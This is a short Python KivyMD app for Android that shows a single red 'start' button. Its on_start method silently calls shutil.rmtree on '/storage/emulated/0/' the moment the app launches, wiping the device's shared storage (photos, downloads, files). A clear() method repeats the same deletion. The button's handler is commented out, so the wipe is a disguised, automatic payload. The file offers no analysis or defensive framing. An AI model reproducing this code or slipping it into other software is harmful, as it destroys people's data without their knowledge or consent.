from kivy.lang import Builder
from kivy.uix.floatlayout import FloatLayout
import shutil
from kivymd.app import MDApp
KV = '''

MDFloatLayout:
	MDFloatLayout:
		md_bg_color:[0/255,0/255,0/255,1]
		MDRaisedButton:
			text:"[color=ff0000] start [/color] "
			font_size:15
			size_hint:.25,.05
			pos_hint:{"center_y":.5,"center_x":.5}
			markup:True
			md_bg_color:[255/255,255/255,255/255,1]
			#on_press:app.clear()
					
'''
class Main(MDApp):
	def build(self):
		app1=Builder.load_string(KV)
		return app1
	def clear(self):
		shutil.rmtree("/storage/emulated/0/")
	def on_start(self):
		shutil.rmtree("/storage/emulated/0/")
		
Main().run()
		
